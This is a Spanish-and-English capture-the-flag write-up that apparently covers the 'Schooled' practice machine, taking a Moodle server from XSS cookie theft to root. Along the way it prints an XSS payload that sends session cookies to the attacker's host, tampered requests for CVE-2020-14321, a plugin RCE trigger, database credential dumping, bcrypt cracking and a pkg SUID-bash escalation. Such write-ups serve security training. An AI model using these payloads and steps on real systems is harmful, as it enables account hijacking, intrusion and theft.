# Schooled Writeup
![Schooled](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Schooledtarjeta.png)

**Keyword summary:**
- VHost Brute Force
- Moodle (XSS)
- Stealing session cookie
- CVE-2020-25627
- CVE-2020-14321.
- Mass Assignment Attack
- Cracking Hashes from Moodle database
- Abusing sudoers privilege

# Enumeration
We will start by performing a scan of the ports that are open on the target IP, using the nmap tool.
This can be done as follows:
```bash
nmap -sS --min-rate 2500 -vvv -n --open -Pn [IP] 
```
Replace '[IP]' with the IP address to be scanned

![Puertos](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Ports.PNG)

We will see that the open ports are:

- 22/tcp | ssh
- 80/tcp | http
- 33060/tcp | mysqlx

now we can do para obtener un poco mas de información sobre los puertos abiertos de la IP Objetivo:
```bash
nmap -sCV -p22,80,33060 [IP]
```

Al enumerar los puertos de la IP objetivo, hemos identificado que nos interesa por ahora particularmente la página web alojada en el puerto 80.

### Website Enumeration
Llevaremos a cabo dos procesos de enumeración sobre esta pagina antes de ingresar en ella.

- Con la herramienta "whatweb" podemos obtener mas información de esta pagina
- Con el script "http-enum" con el que cuenta la herramienta nmap 
- 
```bash
whatweb [IP]
```
```bash
nmap --script http-enum -p80 [IP]
```
![whatweb&scriptnmap](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/whatweb%26scriptnmap.PNG)


De esta forma podemos ver que el sitio web en primer lugar es un FreeBSD y además podemos observar lo que parece ser un correo electronico **"admissions@schooled.htb"** Lo que nos puede interesar acerca de esto es que contamos con un dominio ```"schooled.htb"```. 

Asi que procederemos a entrar al sitio web

![web](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/web.PNG)

Por ahora no vemos nada interesante, así, que en caso de que se este aplicando **Virtual Hosting** sobre el sitio web
Añadiremos en el archivo "/etc/hosts" el dominio que encontramos anteriormente. Ya que en algunos casos, acceder al sitio web mediante la dirección IP y acceder mediante un dominio no es lo mismo

**¿Que es Virtual Hosting?** [https://httpd.apache.org/docs/2.4/vhosts/].


![schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/schooled.htb.PNG)

Ingresemos al sitio nuevamente haciendo uso de este dominio

![webSchooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/webSchooled.htb.PNG)

Y en este caso, pues el contenido de la pagina web es exactamente el mismo.
Así que explorando un poco más la pagina, en el apartado "teachers" podemos ver profesores que hacen parte de la institución educativa y su respectivo rol en esta. 

![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)

De esta forma podemos ver que como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager

# Moodle
****
Lo que podemos hacer ahora en busqueda de mas información sobre el sitio web es aplicar un reconocimiento de subdominios. Esto lo podemos hacer a través de la herramienta "gobuster"

```bash
gobuster vhost -u http://schooled.htb -w [wordlistPATH] -t 64 --apend-domain
```
![subdominio](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/subdominio.PNG)

gobuster encontró como subdominio existente en el sitio web **"moodle.schooled.htb"**
Así que vamos a agregar este subdominio en nuestro archivo "/etc/hosts"

![moodle.schooled.htb](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodle.schooled.htb.PNG)

**¿Que es Moodle?** [https://es.wikipedia.org/wiki/Moodle]

![paginamoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/paginamoodle.PNG)
Efectivamente, el sitio web cuenta con un subdominio en el que podemos ver un Moodle que hace parte de la institución educativa

Así que creemos una cuenta nueva y entremos al moodle

Algo curioso es que al intentar registrarme en el Moodle, al colocar un correo electronico es requisito que este pertenezca al dominio **"student.schooled.htb"**


![emailleakinfo](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/emailleakinfo.PNG)


(Al incorporar este subdominio en el archivo /etc/hosts nos lleva a la misma pagina inicial)

Una vez creada la cuenta nos encontraremos con esto:

![moodledashboard](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledashboard.PNG)

Si nos dirigimos al apartado de "site home" encontraremos una serie de cursos que se ofrecen en la institución educativa. Revisando cada uno de los cursos podremos ver que solo podemos auto-inscribirnos en el curso de "Mathematics" que dirige el profesor "Manuel Phillips". Así que nos inscribiremos.

# Moodle Foothold
****
![Announcements](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Announcements.PNG)
![reminder](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reminder.PNG)

En la sección "Announcements" del curso "Mathematics" en el que nos inscribimos, podemos ver el anuncio "Reminder for joining students". En este, el profesor nos indica that we need to set our ```"MoodleNet profile"``` y que estara revisando los perfiles de los estudiantes inscritos para verificar que el estudiante haya configurado este campo.

Por lo tanto, yendo a los ajustes del perfil de Moodle podemos ver el campo ```"MoodleNet profile"```

![moodlenet](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlenet.PNG)

**Pero... ¿que tipo de información debe ir en este campo?**
Bueno, intentemos escribiendo una palabra de test

![test](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/test.PNG)


Vemos que en nuestro perfil de moodle se muestra:

![showingtest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/showingtest.PNG)

De esta forma, lo que podemos probar como atacantes es verificar si el campo ```"MoodleNet profile"``` es vulnerable a XSS (Cross-Site Scripting)
**¿Que es Cross-Site Scripting?** [https://www.welivesecurity.com/la-es/2021/09/28/que-es-ataque-xss-cross-site-scripting/]

Entonces, lo que haremos es inyectar en el campo ```"MoodleNet profile"``` a test payload como el siguiente:
```bash
<script>alert('XSSTest'.)</script>
```
De esta forma, si actualizamos los cambios realizados en el perfil de Moodle y sí efectivamente el campo ```"MoodleNet profile"``` es vulnerable a **XSS**, al entrar a nuestro perfil de Moodle nos saldra una pequeña ventana emergente

![XSSTest](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/XSSTest.PNG)

Perfecto!
### Exploiting XSS Vulnerabilities for Session Cookie Stealing
Teniendo en cuenta que el profesor estara revisando los perfiles de los estudiantes inscritos al curso, podemos **intentar robar su cookie de sesion** mediante un script malicioso inyectado en el campo ```"MoodleNet profile"```.

Para esto, utilizaremos el siguiente comando para establecer un servidor web simple por el puerto 80 de nuestra maquina
```python
python3 -m http.server 80
```
![python3sever](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/python3sever.PNG)

Ahora inyectaremos en el campo ```"MoodleNet profile"``` el siguiente payload que se encargara de robar la cookie de sesión del usuario que ingrese a nuestro perfil de Moodle 

```sh
<script>var i=new Image(); i.src="http://[OurIP]/?cookie="+btoa(document.cookie);</script>
```

![cookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookie.PNG)


Podemos ver como se envia a nuestro servidor la cookie de sesión del profesor "Manuel Phillips"
Sin embargo, esta cookie se encuentra codificada en base64, asi que tenemos que decodificarla:


![stealingcookie](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/stealingcookie.PNG)


```bash
MoodleSession=lan2a2hc9ub9qhkhdful6mnff2
```
Ahora que contamos con la cookie de sesion del profesor, podemos autenticarnos como el profesor

![cookieantes](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookieantes.PNG)

![cookiedespues](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/cookiedespues.PNG)

Perfecto!

![Impersonification](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Impersonification.PNG)

Podemos ver como en la parte superior derecha se nos muestra que estamos dentro del sistema como el usuario **"Manuel Phillips"**

![Perfilprofe](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/perfilprofe.PNG)

Revisando el perfil del profesor, podemos ver que su correo pertenece a un dominio distinto, podemos probar si este dominio se encuentra como un subdominio del sitio web de la institución educativa. Sin embargo, este subdominio nos redirige a la misma pagina inicial.

# Moodle Version and Possible Vulnerabilities
****

Como Moodle es una aplicación Open Source, podemos investigar un poco acerca de sus contenidos por medio de:
[https://github.com/moodle/moodle]

Existe un archivo que nos permite ver hasta la fecha en que versión de Moodle nos encontramos, esta ruta es:

``` theme/upgrade.txt ```
Así que la podemos colocar en el navegador y consultar el archivo "upgrade.txt"
![versionmoodle](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/versionmoodle.PNG)

Así, parece ser que la **versión de Moodle que esta corriendo en el servidor es la "3.9"**

Con esta información podemos utilizar **"searchsploit"** para buscar vulnerabilidades sobre esta version de moodle
```bash
searchsploit Moodle 3.9
```

Podemos ver un exploit titulado como:
>Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)

![searchsploit](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/searchsploit.PNG)

```bash
searchsploit -x 50180
```

![exploitanalisis](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/exploitanalisis.PNG)

Analizando un poco la estructura del exploit poodemos ver que lo que parece que esté intenta hacer es autenticarnos como manager y luego intentar aumentar los privilegios de la manager account para tener la capacidad de instalar plugins sobre el sistema

_At this point we could directly use the exploit and complete the machine eventually, however, to have a better understanding of what is going on regarding the vulnerability in this version of Moodle, we will do it manually._

Es importante mencionar que Moodle cuenta con un apartado de "Security Announcements", por lo que nos interesa saber de que fecha data la versión 3.9 de Moodle

![moodledate](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodledate.PNG)

Así, en la pagina [https://moodle.org/security/] podemos consultar por la fecha de la versión 3.9 de Moodle

![moodlevuln](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/moodlevuln.PNG)

Así, podemos ver que existe una vulnerabilidad sobre esta versión de Moodle identificada como: **CVE-2020-14321**
en la que podemos escalar privilegios a "manager role" partiendo desde un usuario de "Teacher". La vulnerabilidad funciona mediante la explotación de un "Mass Assignment Attack"

**¿Que es Mass Assignment Attack?**
https://www.vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips/

### Teacher Self-Assignment to Manager Role
****

Partiendo del hecho de que nos encontramos autenticados as the Manuel Phillips Teacher Nos vamos a dirigir a la lista de participantes del curso de matematicas que este usuario dirige. Podemos ver que contamos con un pequeño boton nombrado como "Enrol Users" en el que al parecer tenemos la capacidad de inscribir a estudiantes al curso de manera forzada.

**En este punto quiero que recordemos que contabamos con la información de que profesores se encontraban adscritos a la institución educativa**

![teachers](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/teachers.PNG)

y como atacantes nos interesaria poder acceder a la cuenta de "Lianne Carter" teacher, ya que cuenta con un rol de manager.
Así que intentemos añadir al usuario "Lianne Carter" al curso de matematicas

![Agregaralcurso](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregaralcurso.PNG)

El usuario "Lianne Carter" ha sido exitosanente inscrita en el curso de matematicas

![Agregada](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Agregada.PNG)

Entonces, vamos a eliminar a este usuario de la lista de participantes del curso y analicemos con **Burpsuite** que ocurre cuando se envia la petición al agregar al usuario "Lianne Carter" al curso.

`(request intercepted by Burpsuite)`
```sh
GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=25&roletoassign=5&startdate=4&duration= HTTP/1.1
Host: moodle.schooled.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5 6 Accept-Encoding: gzip, deflate, br
Content-Type: application/json 8 X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://moodle.schooled.htb/moodle/user/index.php?id=5 11 Cookie: MoodleSession=1an2a2hc9ub9qhkhdful6mnff2
```
`(Request Query parameters | From the request intercepted by Burpsuite)`

![burpsuite](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuite.PNG)

```Es importante que la peticion interceptada por Burpsuite la enviemos al Repeater, allí haremos cambios y enviaremos la petición```

Podemos observar que la solicitud pasa dos parametros de interes:
-`userlist%5B%5D = 25`
-`roletoassign = 5`

- **userlist%5B%5D**
Para revisar la lista de usuarios en el sistema, podemos darnos cuenta que si consultamos nuestro perfil de Moodle (Que en este momento corresponde al del usuario Manuel Phillips). Podemos ver que en la barra del buscador la **"id"** del perfil corresponde a aquella identificada con el numero "24"

![profileid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/profileid.PNG)

Si cambiamos este valor en nuestro buscador, por el numero "25" 

![Lianncarterid](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Lianncarterid.PNG)

Se nos redirige al perfil del usuario "Liann Carter" en Moodle 

(creo que esto corresponderia a una vulnerabilidad leve de **Web Parameter Tampering** [https://owasp.org/www-community/attacks/Web_Parameter_Tampering])

**Back to the point**

Lo que podemos hacer entonces, es que haciendo uso de Burpsuite, con la petición interceptada podemos cambiar el valor de "25" a "24". y en seguida para el parametro:
- **roletoassign**
Moodle gestiona mediante la petición al parametro "roletoassign" que rol como profesor se desea tener sobre el usuario que se va a agregar al curso. **[Lo que es demasiado riesgoso].**
Desconocemos a que hace referencia el valor "5", pero podriamos pensar que si este valor es cambiado por un **"1"**. Por lo general este valor hace referencia al rol de **Administrador**. Así que cambiemos este parametro con la idea de que nos otorgaremos un privilegio de **Administrador** sobre el usuario al que vamos a agregar al curso.

Por lo tanto, nuestra petición interceptada deberia lucir de la siguiente forma:

`(Modified request intercepted by Burpsuite)`

>GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=```24```&roletoassign=```1```&startdate=4&duration= HTTP/1.1

>Host: moodle.schooled.htb
>.
>.
><SNIP>

Una vez enviada la petición mediante el **Burpsuite Repeater** , en la sección **Proxy** de **Burpsuite**, let's drop the intercepted request.

when you drop the intercepted request, the user "Lianne Carter" will not be added to the course, so we are going to add her back in the normal way, without intercepting the request, just to have the facility to go to her profile.

Once in the profile of "Lianne Carter" we will be able to notice that we have the privileges of **Log in as Lianne Carter**.

![privilegiosLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/privilegiosLianne.PNG)

Nice!

![logueado](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/logueado.PNG)

Esto es una implementación con la que cuenta Moodle, nos encontramos autenticados como Manuel Phillips but logged in as Lianne Carter

![manuelLianne](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/manuelLianne.PNG)


Ahora, logged in as this user, we will have access to a "Site administration" panel

![Site_administration](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/Site_administration.PNG)

**En Moodle una de las principales formas que hay para lograr inyectar comandos suele ser el panel de Plugins, sin embargo, a pesar de estar autenticados como Liann Carter, parece que no tenemos privilegios para subir Plugins al sistema**

![pluginsoff](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginsoff.PNG)

# Mass Assignment Attack 
****
En el apartado "Users" podemos ver una sección "Permissions" 

![permissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/permissions.PNG)

allí ingresaremos a "Define roles"

![listapermissions](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/listapermissions.PNG)

Si damos click a "Manager" parece que tenemos un listado extenso de todo aquello que "Manager" role tiene permitido en Moodle y todo aquello que "Manager" role no tiene permitido en Moodle.

**¿Que se nos puede ocurrir?** un **Mass Assignment Attack** 
Así que vamos dar click en "Edit", activaremos **Burpsuite** and we will "Save Changes" para interceptar la petición

![burpsuitemass](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/burpsuitemass.PNG)

Lo que vemos en Burpsuite son aquellos permisos y su valor con los que actualmente cuenta el usuario "Lianne Carter" en el sistema.

Existe un repositorio de GitHub acerca del (CVE-2020-14321) [https://github.com/HoangKien1020/CVE-2020-14321]
Aqui, en la sección "Payload to full permissions" parece explotarse un Mass Assignment Attack to have the full permissions in the system. Veremos que el estilo del Payload es muy similar a lo que tenemos en Burpsuite, asi que vamos a reemplazarlo

Ahora, verificaremos que tengamos los privilegios para subir Plugins al sistema

![pluginson](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/pluginson.PNG)


Now, from the same Github repository above, we can download the zip file that is uploaded as a plugin to Moodle [https://github.com/HoangKien1020/Moodle_RCE]

![zipupload](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/zipupload.PNG)

![zipconfirmed](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/zipconfirmed.PNG)

Trigger RCE
>moodle/blocks/rce/lang/en/block_rce.php?cmd=id

So that is the Path that we will have to write in our web browser to execute commands

![RCE](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/RCE.PNG)

## Reverse Shell 
****

Now, what we want to do is to send a **reverse shell** to our system

so with netcat we are going to establish a listening port, in my case I will do it on port "4444" and we will inject through the plugin the following command

![reverse](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/reverse.PNG)

- %26 = &

We have to URL-Encode the "&" because the system might not interpret the command.

Enumerating the system a bit in the path /usr/local/www/apache24/data/moodle

We will find a file "config.php"
Containing database login credentials
![config](https://github.com/0xLJoseb/Apuntes/blob/main/Schooled%20Writeup/Content/config.PNG)

Resulta que el valor de $PATH del usuario que nos provee la shell en el sistema ("www") es muy corto y no abarca todas las vias en las que pueden haber comandos que se puedan utilizar, por esto, una solución que podemos aplicar es en nuestro sistema:

```bash
echo $PATH
```

copiamos el valor de nuestro $PATH, (no importa que hayan rutas que tal vez no existan en la maquina objetivo, esto nos servira para que el usuario ("www") de la shell pueda ejecutar mas comandos). Y en la maquina objetivo escribimos el comando:

```bash
export PATH=[Aqui va todo nuestro $PATH] 
```
Ahora si podremos utilizar comandos como "mysql"
una vez hecho eso:


```bash
mysql -umoodle -pPlaybookMaster2020 -e 'show databases'
```
Aqui debe usarse la flag -e para ejecutar comandos sin entrar a un "mysql" interactivo, partiendo desde que no se cuenta con una consola interactiva en la reverse shell lo cual nos dara problemas para ejecutar comandos interactivos :/

![showdatabases]()

```bash
mysql -umoodle -pPlaybookMaster2020 -e 'show tables' moodle
```

![showtables]()

```bash
mysql -umoodle -pPlaybookMaster2020 -e 'describe mdl_user' moodle
```

![columns]()

Aqui las columnas de interes serian username | password | email


```bash
mysql -umoodle -pPlaybookMaster2020 -e 'select username,password,email from mdl_user' moodle
```

![credenciales]()
![home]()
De todas estas nos interesan aquellas de "jamie" y "steve" ya que son los usuarios que cuentan con un directorio en /home/

Además de que Jamie es Admin y pues steve no esta en el sistema. Así que vamos a copiarnos a nuestro sistema el Hash correspondiente a Jamie (Admin)

Si rompemos el hash y pensamos en que podria estarse reutilizando la clave del usuario Jamie, podriamos ingresar por ssh al sistema
Podemos romper el hash utilizando herrramientas como hashcat y reconociendo el formato con el que esta encriptada la contraseña
Esto lo podemos hacer asi:

### Pequeña anotación [¿Como reconocer probables formatos de Hashes?]


Esto lo podemos hacer mediante el uso de expresiones regulares
Tenemos nuestro Hash a romper:

![hashformat]()

Así:
```bash
hashcat --example-hashes | grep -oP '\$2\w\$\d{2}\$'
```
De esta forma estamos diciendo que nuestro hash esta compuesto primeramente por los simbolos "$2" seguido de un caracter (y) representado como "w" y luego sigue otro signo "$", seguido de dos digitos y un "$" más
**[Puede sonar confuso, pero simplemente estamos ingresando el patrón que se observa en el hash con el que contamos]**

![hashrecognize1]()

y vemos que hay por lo menos 4 tipos de formatos que se adecuan a nuestro hash, sin embargo, vemos que aquellos de forma ($2a$05$) serian los mas probables, asi que vamos a filtrar con grep para ese patrón:
**(Es necesario colocar antes de los signos "$" un "\" para que sea posible reconocerlos)**
```bash
hashcat --example-hashes | grep '\$2a\$05\$' -B 11
```

Y podemos ver que el formato mas probable del hash es **"bcrypt"**

Así que entonces utilizemos **hashcat** para crackear el Hash.

```bash
hashcat -m 3200 -a 0 hash /[wordlist] --user
```
Donde:
- -m indica el modo a utilizar para romper el hash (bcrypt)
- -a indica el modo de ataque (fuerza bruta)
- hash (nombre del archivo donde se encuentra el hash)
- wordlist = wordlist (podria ser rockyou)
- --user (Flag que le indica a Hashcat que el hash se encuentra en formato [Usuario:Hash])

**(Otra Nota interesante)**
Si ya se ha crackeado un hash con hashcat y queremos ver su resultado en texto plano, podemos usar:
```bash
hashcat -m 3200 --show hash --user
```
![hash]()


De esta forma la contraseña del usuario Jamie es: **!QAZ2wsx**

Entonces, podemos intentar entrar al sistema por **ssh** utilizando el Usuario de Jamie y la contraseña que hemos crackeado.

```bash
ssh jamie@[IP]
```
![userflag]()

**Perfecto!**

Ahora, ya que nos encontramos como el usuario **"Jamie"**, la idea es convertirnos en **root** dentro del sistema.

con el comando:

```bash
sudo -l
```

Nos es posible ver que tenemos algunos privilegios a nivel de **sudoers**
![sudoers]()

Así que vamos a recurrir a un recurso util para situaciones en las que contamos con binarios que podemos ejecutar [https://gtfobins.github.io/]

![pkgtfobins]()

**¿Cual es el objetivo?**
Podemos ver que la explotación de este binario para escalar privilegios utiliza **fpm**, la maquina objetivo no cuenta con este recurso, así que nosotros se lo proporcionaremos
Además el campo 'id' es aquel en el que vamos a poder ejecutar comandos, sin embargo nosotros no queremos ejecutar el comando 'id', sino, mas bien queremos ejecutar algo como '/bin/bash'. Podemos ver la ruta de este binario mediante:
```bash
ls -l /bin/bash
```
![SUID]()

Podemos ver que el binario "/usr/local/bin/bash" tiene permisos "755".

Nuestro **objetivo** seria que el binario que se encuentra en la ruta: "/usr/local/bin/bash" cuente con permisos **SUID** (4755)
**¿Que es el permiso SUID?** [https://www.scaler.com/topics/special-permissions-in-linux/]

**Entonces...**
Nos instalamos **fpm** (En archlinux):

```bash
paru -S fpm
```
Entonces, una vez con fpm en la maquina. Podemos actuar de la siguiente forma, vamos a querer que nuestro comando luzca de esta forma:

![comandoSUID]()

y luego procedemos a ejecutar:

```bash
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

Y se nos creara en nuestro directorio de trabajo un archivo ".txz". Vamos a subir este archivo a la maquina victima y procederemos a instalarlo:

`[Maquina Local]`
```bash
python3 -m http.server
```
`[Maquina Victima]`
`[Ojo, hacerlo en el directorio /tmp]`
```bash
curl -o x-1.0.txz http://[OurIP]/[File]
```
Una vez con el ".txz" en la maquina victima, segun **gtfobins** tendriamos que ejecutar:

```bash
sudo pkg install -y --no-repo-update ./x-1.0.txz
```

![SUIDaccomp]()

"/usr/local/bin/bash" ahora cuenta con permisos **SUID**

![bashp]()


A través del comando **bash -p** se inicia una nueva instancia de la shell Bash. La nueva instancia de Bash heredará los privilegios del propietario del archivo, que en este caso sería **root**

![pwned.]()



